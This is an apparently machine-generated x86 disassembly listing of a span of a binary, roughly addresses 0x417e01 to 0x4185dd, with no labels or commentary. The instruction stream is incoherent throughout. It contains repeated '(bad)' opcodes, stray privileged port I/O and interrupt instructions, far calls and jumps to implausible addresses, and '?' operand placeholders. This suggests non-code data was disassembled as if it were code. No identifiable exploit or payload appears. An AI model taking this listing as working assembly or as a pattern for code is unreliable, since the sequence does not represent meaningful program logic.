  417e01:	pop    edi
  417e02:	adc    BYTE PTR [edi],al
  417e04:	dec    ebp
  417e05:	sahf   
  417e06:	pop    ebp
  417e07:	jne    0x417e73
  417e09:	fiadd  WORD PTR [ebp+edx*2+0x5d]
  417e0d:	fnstcw WORD PTR [ecx-0x72]
  417e10:	or     edx,DWORD PTR [ecx-0x53]
  417e13:	std    
  417e14:	mov    esp,0x75f5122a
  417e19:	pop    eax
  417e1a:	into   
  417e1b:	leave  
  417e1c:	push   ds
  417e1d:	stos   DWORD PTR es:[edi],eax
  417e1e:	pop    ebx
  417e1f:	pop    ebp
  417e20:	lahf   
  417e21:	fisttp QWORD PTR ds:0x586e6b86
  417e27:	xchg   ebp,eax
  417e28:	cmp    DWORD PTR [edx+0xb],eax
  417e2b:	test   DWORD PTR [ebx+0x40cd0d92],ebx
  417e31:	fucomp st(6)
  417e33:	inc    DWORD PTR ds:0xe48e7bde
  417e39:	push   esp
  417e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e3b:	aam    0x38
  417e3d:	mov    ebx,0x66c73a90
  417e42:	out    0x3f,al
  417e44:	dec    ecx
  417e45:	dec    esi
  417e46:	cmp    BYTE PTR [edx-0x28],cl
  417e49:	mov    BYTE PTR [eax+0xe],bl
  417e4c:	sub    ebx,eax
  417e4e:	es int 0x9b
  417e51:	inc    edi
  417e52:	mov    esp,0xfc035ebb
  417e57:	jnp    0x417e25
  417e59:	frstor [eax+0x47]
  417e5c:	mov    esp,0xaf056fdf
  417e61:	sub    al,0x91
  417e63:	mov    al,0x24
  417e65:	inc    edi
  417e66:	push   esp
  417e67:	(bad)  
  417e68:	cld    
  417e69:	out    0xf,al
  417e6b:	xor    BYTE PTR [edi],0xa5
  417e6e:	cli    
  417e6f:	das    
  417e70:	push   edx
  417e71:	je     0x417e0a
  417e73:	pop    ebx
  417e74:	xor    BYTE PTR [edx+ebp*1],bh
  417e77:	pop    edi
  417e78:	stos   DWORD PTR es:[edi],eax
  417e79:	clc    
  417e7a:	mov    dl,0x41
  417e7c:	fimul  WORD PTR ds:0x7e97
  417e81:	sub    BYTE PTR [ecx],al
  417e83:	jl     0x417e19
  417e85:	dec    ecx
  417e86:	nop
  417e87:	xor    edi,DWORD PTR [ecx-0x27]
  417e8a:	and    al,BYTE PTR [ebp+0x4cd731af]
  417e90:	lock out 0x1f,eax
  417e93:	sub    bl,dh
  417e95:	add    BYTE PTR [eax-0x3b],al
  417e98:	das    
  417e99:	jp     0x417e2b
  417e9b:	sbb    eax,0x8b8ba861
  417ea0:	mov    esp,0x3949b1e3
  417ea5:	lds    eax,FWORD PTR [esi]
  417ea7:	shl    DWORD PTR [edx],0x56
  417eaa:	in     eax,0x99
  417eac:	fwait
  417ead:	mov    WORD PTR [edx+0x25],?
  417eb0:	lahf   
  417eb1:	xchg   esp,eax
  417eb2:	mov    edx,0x9cde9390
  417eb7:	mov    DWORD PTR [edx+eax*4-0x71ca388b],edx
  417ebe:	nop
  417ebf:	fcom   DWORD PTR [eax+0x587b9a1f]
  417ec5:	mov    ebx,edx
  417ec7:	ror    WORD PTR [ebx],1
  417eca:	mov    ecx,DWORD PTR [edx]
  417ecc:	sbb    edx,ebp
  417ece:	inc    ecx
  417ecf:	cli    
  417ed0:	mov    ?,WORD PTR [esi+0x67b8090]
  417ed6:	lahf   
  417ed7:	and    edi,eax
  417ed9:	addr16 out dx,al
  417edb:	dec    esp
  417edc:	inc    edx
  417edd:	cdq    
  417ede:	mov    ah,0x8
  417ee0:	retf   
  417ee1:	mov    al,0x70
  417ee3:	lea    ebx,[edx]
  417ee5:	adc    BYTE PTR [esi-0x2f],bh
  417ee8:	fwait
  417ee9:	call   DWORD PTR [ebp-0x13]
  417eec:	mov    ch,0xfb
  417eee:	nop
  417eef:	lods   al,BYTE PTR ds:[esi]
  417ef0:	call   0x5618f6d2
  417ef5:	popa   
  417ef6:	pop    es
  417ef7:	add    DWORD PTR [ebx-0x3e556fcf],esi
  417efd:	adc    ecx,DWORD PTR [esp+eax*2-0x5b]
  417f01:	mov    al,ds:0xe5444d71
  417f06:	lods   eax,DWORD PTR ds:[esi]
  417f07:	inc    edx
  417f08:	push   ecx
  417f09:	repz pop ds
  417f0b:	(bad)  
  417f0c:	cmp    BYTE PTR [ecx-0x14],ah
  417f0f:	mov    cl,0x5a
  417f11:	jecxz  0x417eae
  417f13:	xor    BYTE PTR [eax-0x6a],0x13
  417f17:	xor    cl,BYTE PTR [esi+ebp*2]
  417f1a:	jg     0x417f6d
  417f1c:	std    
  417f1d:	fnstsw WORD PTR [ecx]
  417f1f:	push   0x6d2a3232
  417f24:	xor    BYTE PTR [edi+0x63d33990],bh
  417f2a:	out    0x90,al
  417f2c:	push   ecx
  417f2d:	xchg   ebx,eax
  417f2e:	xchg   edi,eax
  417f2f:	dec    ecx
  417f30:	pop    esp
  417f31:	ins    DWORD PTR es:[edi],dx
  417f32:	sbb    al,ah
  417f34:	pop    ebp
  417f35:	cmp    ecx,0x3d
  417f38:	stos   BYTE PTR es:[edi],al
  417f39:	ret    0x1098
  417f3c:	mov    ebp,0xdca06e3b
  417f41:	cwde   
  417f42:	xchg   ebx,eax
  417f44:	popf   
  417f45:	mov    ebx,0xe50aed6c
  417f4a:	mov    fs,WORD PTR [esi+0x59745b99]
  417f50:	inc    edx
  417f51:	push   esi
  417f52:	int3   
  417f53:	test   eax,0x562be8aa
  417f58:	fwait
  417f59:	retf   0x5eb3
  417f5c:	jbe    0x417fc6
  417f5e:	jecxz  0x417eec
  417f60:	inc    edi
  417f61:	push   esi
  417f62:	xchg   edx,eax
  417f63:	gs leave 
  417f65:	inc    ecx
  417f66:	jnp    0x417fb2
  417f68:	mov    eax,gs:0x569cf3b4
  417f6e:	nop
  417f6f:	mov    eax,DWORD PTR [edx]
  417f71:	dec    edx
  417f72:	xchg   ebx,eax
  417f73:	jmp    0x4bc28c17
  417f78:	fbstp  TBYTE PTR [ebx+ebp*2-0x42]
  417f7c:	mov    ah,0xae
  417f7e:	adc    esp,DWORD PTR [edx]
  417f80:	outs   dx,DWORD PTR ds:[esi]
  417f81:	ss nop
  417f83:	(bad)  [edx+ecx*8-0x11d69214]
  417f8a:	scas   eax,DWORD PTR es:[edi]
  417f8b:	dec    ecx
  417f8c:	fcmovu st,st(1)
  417f8e:	pop    eax
  417f8f:	dec    ecx
  417f90:	xlat   BYTE PTR ds:[ebx]
  417f91:	mov    bl,0x61
  417f93:	pop    ebp
  417f94:	fwait
  417f95:	repz pop es
  417f97:	mov    BYTE PTR [ecx+edi*2-0x1f44ed0c],bh
  417f9e:	sbb    BYTE PTR [edx-0x510c3d07],0x8b
  417fa5:	loopne 0x417f3f
  417fa7:	xor    eax,0xbcc1da9b
  417fac:	or     al,0xc5
  417fae:	pop    eax
  417faf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fb0:	lods   eax,DWORD PTR ds:[esi]
  417fb1:	push   ebp
  417fb2:	scas   eax,DWORD PTR es:[edi]
  417fb3:	dec    esp
  417fb4:	mov    ds:0xfc2c45b6,eax
  417fb9:	sbb    ecx,DWORD PTR [eax-0x6f524a15]
  417fbf:	cmp    esp,eax
  417fc1:	inc    ecx
  417fc2:	rcl    BYTE PTR [ebp+eiz*8+0x34a2209],0x17
  417fca:	gs daa 
  417fcc:	sahf   
  417fcd:	dec    esi
  417fce:	mov    dl,0xf7
  417fd0:	out    0x84,eax
  417fd2:	pop    edi
  417fd3:	dec    edx
  417fd4:	mov    al,0x62
  417fd6:	rep lods eax,DWORD PTR ds:[esi]
  417fd8:	mov    cl,0xd8
  417fda:	push   edi
  417fdb:	dec    edx
  417fdc:	neg    BYTE PTR ds:0x6865b7ec
  417fe2:	adc    ebp,edx
  417fe4:	fwait
  417fe5:	sti    
  417fe6:	jle    0x418046
  417fe8:	push   0x5498aa67
  417fed:	fisubr WORD PTR [ebx]
  417fef:	ins    BYTE PTR es:[edi],dx
  417ff0:	mov    dl,0x85
  417ff2:	popf   
  417ff3:	xchg   eax,esp
  417ff5:	mov    dl,0x90
  417ff7:	out    dx,al
  417ff8:	pop    ecx
  417ff9:	fs dec eax
  417ffb:	mov    al,0x8c
  417ffd:	or     BYTE PTR [edx+0x4e],ah
  418000:	and    al,0x7f
  418002:	rcr    esi,cl
  418004:	inc    esp
  418005:	pop    esi
  418006:	ja     0x417fe6
  418008:	mov    al,0x5e
  41800a:	nop
  41800b:	or     dl,al
  41800d:	je     0x417ff4
  41800f:	aam    0x73
  418011:	test   al,0x62
  418013:	dec    edx
  418014:	loope  0x418051
  418016:	shl    DWORD PTR [ebp-0x4a],0x72
  41801a:	das    
  41801b:	leave  
  41801c:	xlat   BYTE PTR ds:[ebx]
  41801d:	cmp    eax,0x34644b49
  418022:	test   al,0x2e
  418024:	mov    edi,0xae4e7854
  418029:	(bad)  
  41802a:	mov    dh,0x50
  41802c:	std    
  41802d:	scas   eax,DWORD PTR es:[edi]
  41802e:	or     DWORD PTR [eax-0x44],edx
  418031:	cmp    eax,0xd0c50d27
  418036:	sahf   
  418037:	xor    eax,0x4b3118b1
  41803c:	xchg   ecx,eax
  41803d:	sbb    bl,BYTE PTR [edx+edi*4+0x77]
  418041:	into   
  418042:	pop    ebp
  418043:	dec    ebx
  418044:	sbb    eax,0x6c93a964
  418049:	sub    dh,BYTE PTR [edx+ebp*4+0x57]
  41804d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41804e:	or     eax,0xee599b14
  418053:	cmc    
  418054:	fdivr  DWORD PTR [eax+0xf]
  418057:	nop
  418058:	call   0x6f223f3a
  41805d:	push   ebx
  41805e:	dec    ecx
  41805f:	test   DWORD PTR [edx+ebp*2-0x70],esi
  418063:	xchg   ebp,eax
  418064:	sub    al,0x5f
  418066:	rcl    BYTE PTR [edx+ecx*1-0x73],cl
  41806a:	or     DWORD PTR [edx+0x64],ecx
  41806d:	and    al,0xea
  41806f:	add    al,0x86
  418071:	lock and ebp,esi
  418074:	ds repz fucomip st,st(1)
  418079:	and    ch,BYTE PTR [esi+0x7ddc69b]
  41807f:	mov    ds:0x4813e565,eax
  418084:	loope  0x4180b2
  418086:	nop
  418087:	pop    esi
  418088:	mov    esi,0xdef93cd4
  41808d:	fist   WORD PTR [edi+0x4d]
  418090:	jo     0x41810b
  418092:	in     al,dx
  418093:	call   0xbaf:0x9e283638
  41809a:	xchg   ecx,eax
  41809b:	mov    bh,0xac
  41809d:	adc    ch,BYTE PTR [edi+0x6c431b44]
  4180a3:	mov    al,ds:0x42b2de93
  4180a8:	loope  0x41808c
  4180aa:	push   ebp
  4180ab:	fild   DWORD PTR ds:0xb46f9ea7
  4180b1:	enter  0xca57,0x6e
  4180b5:	add    BYTE PTR [esi],cl
  4180b7:	xchg   DWORD PTR [eax-0x3a],ecx
  4180ba:	call   0x52d9:0x6c3d094c
  4180c1:	sbb    al,0x20
  4180c3:	(bad)  
  4180c4:	sahf   
  4180c5:	adc    eax,0x1a9bcf74
  4180ca:	ins    DWORD PTR es:[edi],dx
  4180cb:	ret    
  4180cc:	shl    dh,1
  4180ce:	ja     0x418113
  4180d0:	mov    esi,0xad5e51dd
  4180d5:	xchg   eax,ebx
  4180d7:	rol    DWORD PTR [esi-0x45b3700d],1
  4180dd:	mov    ?,esi
  4180df:	or     DWORD PTR [eax+0x3c],0xe8b74a77
  4180e6:	aaa    
  4180e7:	rcl    edi,1
  4180e9:	popa   
  4180ea:	or     al,0x2e
  4180ec:	mov    eax,0x5c11bbe1
  4180f1:	xor    ah,BYTE PTR [edi]
  4180f3:	lods   eax,DWORD PTR ds:[esi]
  4180f4:	cmc    
  4180f5:	mov    esi,DWORD PTR [eax-0x68]
  4180f8:	adc    esi,ebx
  4180fa:	sahf   
  4180fb:	or     eax,0x4318b0b8
  418100:	inc    eax
  418101:	fs nop
  418103:	and    BYTE PTR [ebp+0x33114dda],bl
  418109:	inc    eax
  41810a:	leave  
  41810b:	push   esp
  41810c:	sub    eax,0x9b8c0890
  418111:	(bad)  
  418112:	loopne 0x418181
  418114:	xchg   ecx,eax
  418115:	and    DWORD PTR [ebx+eax*2-0x33dabb57],ecx
  41811c:	(bad)  
  41811d:	(bad)  
  41811e:	push   ds
  41811f:	adc    edi,eax
  418121:	(bad)
  418124:	call   0x8183:0xe56e26c8
  41812b:	cdq    
  41812c:	fwait
  41812d:	pusha  
  41812e:	out    0x25,eax
  418130:	push   esi
  418131:	inc    ebx
  418132:	in     eax,dx
  418133:	push   esp
  418134:	aad    0xe0
  418136:	fs add dl,0x29
  41813a:	stc    
  41813b:	das    
  41813c:	push   ebx
  41813d:	pushf  
  41813e:	scas   al,BYTE PTR es:[edi]
  41813f:	sbb    DWORD PTR [ebx-0x635f0808],ebx
  418145:	and    ah,bh
  418147:	dec    BYTE PTR [eax-0x6589011f]
  41814d:	cdq    
  41814e:	xor    al,BYTE PTR [edx-0x65]
  418151:	xchg   ecx,eax
  418152:	pushf  
  418153:	popf   
  418154:	retf   
  418155:	cmp    ah,BYTE PTR [ecx]
  418157:	cmp    eax,DWORD PTR [esi+ebx*8-0x56]
  41815b:	and    dh,BYTE PTR [ebp-0x1df8cc52]
  418161:	test   DWORD PTR [edi+0x58e8f218],edx
  418167:	add    eax,0xb756b7eb
  41816c:	fiadd  WORD PTR es:[edi+0x54f6309a]
  418173:	scas   eax,DWORD PTR es:[edi]
  418174:	jmp    0xaf0d18d1
  418179:	cwde   
  41817a:	pushf  
  41817b:	add    BYTE PTR [edx],dh
  41817d:	xor    BYTE PTR [eax-0x17],al
  418180:	mov    BYTE PTR ds:[esp+edi*1],cl
  418184:	push   0x6e998bde
  418189:	dec    esp
  41818a:	mov    ecx,0x97087d95
  41818f:	out    0xcf,eax
  418191:	out    0xf1,eax
  418193:	jecxz  0x418130
  418195:	push   esp
  418196:	rcl    DWORD PTR [edi],0x67
  418199:	fisub  WORD PTR ds:0x9cd227ff
  41819f:	sbb    DWORD PTR [ecx-0x74f6136],esp
  4181a5:	push   eax
  4181a6:	js     0x418172
  4181a8:	in     eax,0x4
  4181aa:	rcl    BYTE PTR [edi+0x32],1
  4181ad:	jle    0x4181db
  4181af:	push   cs
  4181b0:	lods   eax,DWORD PTR ds:[esi]
  4181b1:	frstor [eax]
  4181b3:	xsha256 (bad)
  4181b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181b5:	adc    al,0x5b
  4181b7:	or     BYTE PTR [ecx+0x5462ce5c],0xde
  4181be:	icebp  
  4181bf:	adc    DWORD PTR [ecx+0x1b005644],edx
  4181c5:	add    al,0xe2
  4181c7:	and    ah,BYTE PTR [eax-0x22]
  4181ca:	jecxz  0x4181a5
  4181cc:	add    al,0x91
  4181ce:	push   ebx
  4181cf:	hlt    
  4181d0:	fwait
  4181d1:	jl     0x4181f5
  4181d3:	push   edx
  4181d4:	push   ebx
  4181d5:	cmp    bh,BYTE PTR [edx+0x23de43cd]
  4181db:	mov    WORD PTR [edi],?
  4181dd:	dec    eax
  4181de:	addr16 sub eax,0x5790505e
  4181e4:	xchg   BYTE PTR [eax+0x69bcd72c],al
  4181ea:	aas    
  4181eb:	push   0x89b7518e
  4181f0:	cdq    
  4181f1:	fst    DWORD PTR ds:0x906ee069
  4181f7:	out    dx,al
  4181f8:	jno    0x4181d9
  4181fa:	cdq    
  4181fb:	ds push ecx
  4181fd:	lods   al,BYTE PTR ds:[esi]
  4181fe:	ror    BYTE PTR [ecx-0x50],0xb4
  418202:	jp     0x418280
  418204:	js     0x418260
  418206:	imul   edx,DWORD PTR [ebp-0x67],0x69
  41820a:	nop
  41820b:	test   eax,0x933c7acc
  418210:	add    edi,DWORD PTR [ebp+0x4e]
  418213:	addr16 push edx
  418215:	sub    eax,0xde17a667
  41821a:	and    al,0x4
  41821c:	xchg   esp,eax
  41821d:	or     al,BYTE PTR [eax*8+0x36903495]
  418224:	gs sub bl,bl
  418227:	not    DWORD PTR [esi+ebp*2]
  41822a:	scas   eax,DWORD PTR es:[edi]
  41822b:	inc    ecx
  41822c:	in     al,dx
  41822d:	fst    QWORD PTR [edi-0x35]
  418230:	jmp    0x5a0344e9
  418235:	mov    edi,0xbe2e509b
  41823a:	ja     0x418286
  41823c:	cli    
  41823d:	xlat   BYTE PTR ds:[ebx]
  41823e:	adc    al,0xab
  418240:	sub    cl,BYTE PTR [edx]
  418242:	out    0xbe,eax
  418244:	push   eax
  418245:	ficomp WORD PTR [ebx-0x4b]
  418248:	cmp    al,BYTE PTR [ebx+0xd9bfbbc]
  41824e:	push   ds
  41824f:	loopne 0x4182c4
  418251:	jbe    0x4181f8
  418253:	test   al,0x8f
  418255:	fisubr WORD PTR [edi-0x135e62e6]
  41825b:	jge    0x41826b
  41825d:	out    0x8f,al
  41825f:	cmp    dh,BYTE PTR ds:0xbc6f8f98
  418265:	outs   dx,BYTE PTR ds:[esi]
  418266:	push   ebx
  418267:	dec    ebx
  418268:	mov    cl,0xa3
  41826a:	outs   dx,BYTE PTR ds:[esi]
  41826b:	dec    eax
  41826c:	in     eax,0xe3
  41826e:	test   ecx,0xb98bbf33
  418274:	mov    ebx,0x5d49a6fe
  418279:	push   0x7a5b9058
  41827e:	mov    gs,edi
  418280:	aad    0x89
  418282:	jae    0x41824e
  418284:	jnp    0x4182d5
  418286:	rcr    al,1
  418288:	popf   
  418289:	pushf  
  41828a:	pop    edx
  41828b:	dec    edx
  41828c:	jbe    0x4182e3
  41828e:	mov    ebx,0xc8cc0a45
  418293:	jne    0x418230
  418295:	stc    
  418296:	sub    DWORD PTR [ecx+0x4d],0xcd6eadf7
  41829d:	fucom  st(4)
  41829f:	mov    gs,ax
  4182a2:	shr    eax,cl
  4182a4:	lahf   
  4182a5:	in     al,0xc7
  4182a7:	mov    bl,al
  4182a9:	in     al,0x45
  4182ab:	adc    BYTE PTR [eax+0x14],bl
  4182ae:	nop
  4182af:	imul   esi,DWORD PTR [ebx+0x4b4a3ebf],0xd4e5033a
  4182b9:	mov    ecx,0x979b0eb7
  4182be:	pop    es
  4182bf:	mov    ds:0xd86dcd33,eax
  4182c4:	inc    ebp
  4182c5:	fimul  WORD PTR [eax]
  4182c7:	xor    BYTE PTR [edi],al
  4182c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ca:	fstp   DWORD PTR [ecx]
  4182cc:	xchg   edi,eax
  4182cd:	mov    edx,0x72185190
  4182d2:	aaa    
  4182d3:	and    al,0x5e
  4182d5:	aaa    
  4182d6:	adc    ecx,DWORD PTR [ebp-0x49]
  4182d9:	and    al,dh
  4182db:	mov    edi,0xad58744d
  4182e0:	mov    ?,WORD PTR [ecx]
  4182e2:	nop
  4182e3:	frstor [esi+0x1c0399fa]
  4182e9:	jne    0x418314
  4182eb:	dec    edx
  4182ec:	add    al,0xc7
  4182ee:	dec    ebp
  4182ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182f0:	xchg   BYTE PTR [ecx-0x63],al
  4182f3:	es fwait
  4182f5:	push   es
  4182f6:	sbb    ch,al
  4182f8:	sub    al,0x28
  4182fa:	fcomp  DWORD PTR [ebp+0x605ede75]
  418300:	dec    ebp
  418301:	xchg   esp,eax
  418302:	mov    eax,0x9082da40
  418307:	pop    ecx
  418308:	jnp    0x4182d5
  41830a:	jl     0x418337
  41830c:	mov    WORD PTR [esi-0x1d49951],ss
  418312:	sbb    eax,0x2da0f94a
  418317:	std    
  418318:	xor    BYTE PTR [esi],al
  41831a:	jl     0x41838a
  41831c:	lahf   
  41831d:	or     eax,0xac593361
  418322:	adc    cl,dh
  418324:	pop    ebp
  418325:	in     al,0x7d
  418327:	dec    ebx
  418328:	outs   dx,DWORD PTR ds:[esi]
  418329:	jno    0x4182e0
  41832b:	pop    ecx
  41832c:	pushf  
  41832d:	push   edx
  41832e:	ja     0x41836a
  418330:	dec    ebx
  418331:	rcl    DWORD PTR [eax-0x2d31e529],0x60
  418338:	in     al,0x6
  41833a:	and    BYTE PTR [edx+0x36],cl
  41833d:	cs lods al,BYTE PTR ds:[esi]
  418340:	jp     0x418315
  418342:	mov    dl,0xb3
  418344:	adc    BYTE PTR [ecx],al
  418346:	retf   0x95d5
  418349:	pop    esi
  41834a:	dec    edx
  41834b:	mov    dh,0x85
  41834d:	sub    al,0x58
  41834f:	sti    
  418350:	lods   eax,DWORD PTR ds:[esi]
  418351:	in     al,0x25
  418353:	iret   
  418354:	add    al,0x69
  418356:	mov    eax,0xd9e165c9
  41835b:	add    DWORD PTR [ebx-0x66607bde],ebx
  418361:	inc    ebx
  418362:	pop    ss
  418363:	fs xchg esi,ebx
  418366:	adc    dl,BYTE PTR [ecx-0x6409986f]
  41836c:	nop
  41836d:	into   
  41836e:	nop
  41836f:	inc    ebx
  418370:	cmp    ebp,DWORD PTR [esi+eax*8+0x2a]
  418374:	push   cs
  418375:	call   0x1b1d4a9f
  41837a:	mov    ecx,0xc283f7c
  41837f:	dec    ebx
  418380:	cli    
  418381:	dec    ebx
  418382:	icebp  
  418383:	push   cs
  418384:	fstp   st(1)
  418386:	xchg   DWORD PTR [edi-0x65],esp
  418389:	and    ch,ch
  41838b:	cmp    edi,edi
  41838d:	je     0x41840b
  41838f:	sbb    BYTE PTR [eax],bh
  418391:	fidiv  WORD PTR [edx]
  418393:	or     eax,0xe4958dcd
  418398:	bound  esi,QWORD PTR [esi+ebx*4+0x2e]
  41839c:	into   
  41839d:	cli    
  41839e:	mov    eax,0x3a9c2b89
  4183a3:	sbb    al,0x48
  4183a5:	fiadd  WORD PTR [esi-0x43e93ac0]
  4183ab:	(bad)  
  4183ac:	fisttp WORD PTR [eax]
  4183ae:	nop
  4183af:	sti    
  4183b0:	xchg   ebx,eax
  4183b1:	and    ebp,DWORD PTR [edx+ebx*2-0x29]
  4183b5:	jo     0x418399
  4183b7:	dec    ecx
  4183b8:	mov    bl,BYTE PTR [edx+esi*8-0x56f092a]
  4183bf:	inc    ebx
  4183c0:	sar    DWORD PTR [ebx-0x4c],cl
  4183c3:	retf   0x2217
  4183c6:	dec    edi
  4183c7:	fidiv  WORD PTR [edi+0x73618434]
  4183cd:	fisubr WORD PTR [esi]
  4183cf:	pop    ebp
  4183d0:	enter  0x39a0,0x3e
  4183d4:	mov    DWORD PTR [ecx-0x5d],ebp
  4183d7:	xor    dh,BYTE PTR [esi+ecx*8-0x70]
  4183db:	retf   0x9371
  4183de:	shl    BYTE PTR [edi+0x30c63b33],1
  4183e4:	fwait
  4183e5:	cwde   
  4183e6:	adc    BYTE PTR [eax-0x35],bl
  4183e9:	gs inc ecx
  4183eb:	mov    ebp,0xb190aa10
  4183f0:	mov    ebx,0x9c774d28
  4183f5:	test   DWORD PTR [ebp-0x15224540],0x62b8a7e3
  4183ff:	js     0x4183a3
  418401:	push   edx
  418402:	nop
  418403:	out    0x9,eax
  418405:	in     al,dx
  418406:	leave  
  418407:	outs   dx,DWORD PTR ds:[esi]
  418408:	xchg   ebx,eax
  418409:	into   
  41840a:	dec    esp
  41840b:	dec    edx
  41840c:	pop    edi
  41840d:	and    al,0xc5
  41840f:	mov    ebp,0xeccd580c
  418414:	fwait
  418415:	in     al,dx
  418416:	or     edx,DWORD PTR [edx-0x526e8719]
  41841c:	repnz in al,0xbe
  41841f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418420:	ins    DWORD PTR es:[edi],dx
  418421:	stos   DWORD PTR es:[edi],eax
  418422:	fidivr DWORD PTR [ecx-0x7f455fad]
  418428:	fwait
  418429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41842a:	cmp    eax,0xe80b66a5
  41842f:	in     eax,dx
  418430:	pop    ss
  418431:	fisub  WORD PTR [eax-0xe297e31]
  418437:	repz test eax,0x285490dc
  41843d:	adc    bl,BYTE PTR [eax+0x3e70b078]
  418443:	xchg   edx,eax
  418444:	mov    cl,0x5d
  418446:	nop
  418447:	mov    ds:0xc0041d0,al
  41844c:	jno    0x4184b5
  41844e:	nop
  41844f:	or     eax,0xb341d7bc
  418454:	sahf   
  418455:	pop    ebx
  418456:	add    al,0x4a
  418458:	push   ecx
  418459:	int    0x99
  41845b:	dec    ebx
  41845c:	mov    eax,ds:0x9b7651f0
  418461:	in     eax,0xc4
  418463:	push   edi
  418464:	dec    ebp
  418465:	sub    dh,BYTE PTR [edi]
  418467:	inc    eax
  418468:	test   al,0xfa
  41846a:	lock nop
  41846c:	rcr    DWORD PTR [ebp+0x7a0c720a],0x4e
  418473:	das    
  418474:	fwait
  418475:	mov    ds:0xed1bff43,eax
  41847a:	ins    BYTE PTR es:[edi],dx
  41847b:	lods   al,BYTE PTR ds:[esi]
  41847c:	jno    0x41845c
  41847e:	cs test al,0x4d
  418481:	icebp  
  418482:	not    bl
  418484:	jecxz  0x4184a1
  418486:	nop
  418487:	call   0x8584:0xcb0c98b6
  41848e:	or     ecx,DWORD PTR [ebx-0x47]
  418491:	mov    WORD PTR [eax+0x42e88170],fs
  418497:	jp     0x4184cc
  418499:	add    DWORD PTR [eax-0xfd366f],edx
  41849f:	and    edx,DWORD PTR [esi+0x65]
  4184a2:	popa   
  4184a3:	dec    edx
  4184a4:	clc    
  4184a5:	clc    
  4184a6:	dec    esp
  4184a7:	mov    ah,0x98
  4184a9:	cli    
  4184aa:	and    al,0x56
  4184ac:	xchg   edi,eax
  4184ad:	lods   al,BYTE PTR ds:[esi]
  4184ae:	nop
  4184af:	bound  esp,QWORD PTR [ebp+ecx*1+0x2f32de78]
  4184b6:	xchg   ebx,eax
  4184b7:	dec    ecx
  4184b8:	aas    
  4184b9:	adc    ebx,edi
  4184bb:	mov    al,0xe0
  4184bd:	hlt    
  4184be:	jne    0x4184f8
  4184c0:	fwait
  4184c1:	clc    
  4184c2:	call   0xb280210b
  4184c7:	jnp    0x418519
  4184c9:	fisub  WORD PTR [edx]
  4184cb:	add    BYTE PTR [eax-0x788fbca7],ah
  4184d1:	lea    edx,[eax-0x525cea12]
  4184d7:	and    ebp,DWORD PTR [ebx]
  4184d9:	sbb    eax,0x4f944a56
  4184de:	mov    BYTE PTR [edi+0x6b51650a],ah
  4184e4:	fwait
  4184e5:	mov    ebx,0x4a4adcd1
  4184ea:	jb     0x4184b3
  4184ec:	sbb    dh,0xf4
  4184ef:	frstor [edi]
  4184f1:	jnp    0x41847d
  4184f3:	stos   DWORD PTR es:[edi],eax
  4184f4:	pop    esi
  4184f5:	cmp    eax,0x9e93e290
  4184fa:	imul   esi,esi,0xffffffa2
  4184fd:	jb     0x418563
  4184ff:	dec    edx
  418500:	push   eax
  418501:	dec    ebp
  418502:	mov    ds:0x478d7a71,eax
  418507:	mov    eax,0x7c5e9e9b
  41850c:	sbb    eax,0xb0e0f041
  418511:	(bad)  
  418513:	fdivr  st(4),st
  418515:	or     DWORD PTR [ecx+0x57],ebx
  418518:	sahf   
  418519:	push   edi
  41851a:	nop
  41851b:	mov    eax,ds:0xf9d43099
  418520:	mov    edi,0x8cc50975
  418525:	(bad)  
  418527:	leave  
  418528:	call   0x3da2:0xf9ff678
  41852f:	push   0x2277949e
  418534:	sti    
  418535:	fiadd  WORD PTR [eax+0x1]
  418538:	fwait
  418539:	xor    DWORD PTR [esi+0x7c],ebp
  41853c:	(bad)  
  41853d:	fidivr WORD PTR [ecx-0x76d57e05]
  418543:	maxps  xmm5,XMMWORD PTR [esi+0x49baebc9]
  41854a:	xor    ch,dl
  41854c:	jp     0x41859c
  41854e:	xchg   esp,eax
  41854f:	push   0xa151c135
  418554:	sbb    BYTE PTR [edi],0x78
  418557:	enter  0x3608,0x2b
  41855b:	sbb    eax,0xf2ca5da6
  418560:	test   eax,0x76e6f06a
  418565:	mov    edx,0xd32bd22f
  41856a:	xchg   ebp,eax
  41856b:	mov    ch,0x96
  41856d:	jne    0x41855c
  41856f:	or     BYTE PTR [ebx-0x6a],bl
  418572:	in     eax,0xce
  418574:	out    0x51,al
  418576:	push   ebx
  418577:	pop    eax
  418578:	je     0x418559
  41857a:	out    0xa9,al
  41857c:	jnp    0x418577
  41857e:	and    DWORD PTR [ebx-0x23],ebx
  418581:	ret    
  418582:	fsub   st,st(2)
  418584:	mov    esp,0xa4f3a2dd
  418589:	mov    ?,esp
  41858b:	adc    bl,0xdd
  41858e:	outs   dx,BYTE PTR ds:[esi]
  41858f:	mov    ah,0x15
  418591:	mul    BYTE PTR [edi+0x7a]
  418594:	pop    esi
  418595:	scas   eax,DWORD PTR es:[edi]
  418596:	nop
  418597:	mov    esi,0xdad8e612
  41859c:	repz setge BYTE PTR [ebp+0xd]
  4185a1:	xor    ecx,esp
  4185a3:	push   eax
  4185a4:	cmp    al,BYTE PTR fs:[edi+0x1a]
  4185a8:	mov    esi,0xf7a4392d
  4185ad:	lahf   
  4185ae:	mov    bl,0x4c
  4185b0:	sti    
  4185b1:	inc    edi
  4185b2:	retf   
  4185b3:	sbb    eax,0xac218f58
  4185b8:	retf   
  4185b9:	inc    ebx
  4185ba:	cs pop eax
  4185bc:	ins    DWORD PTR es:[edi],dx
  4185bd:	sub    cl,BYTE PTR [esi]
  4185bf:	push   edi
  4185c0:	pop    ebx
  4185c1:	test   eax,0xba17ba59
  4185c6:	xchg   ebx,eax
  4185c7:	mov    dh,0xd4
  4185c9:	idiv   eax
  4185cb:	rcr    al,0xc5
  4185ce:	int3   
  4185cf:	ins    DWORD PTR es:[edi],dx
  4185d0:	fcmovnbe st,st(3)
  4185d2:	lods   eax,DWORD PTR ds:[esi]
  4185d3:	dec    esp
  4185d4:	lock sahf 
  4185d6:	pusha  
  4185d7:	and    ch,BYTE PTR [ebp+edx*8+0x2c]
  4185db:	or     esi,ebx
  4185dd:	mov    esi,0xd5b33a21
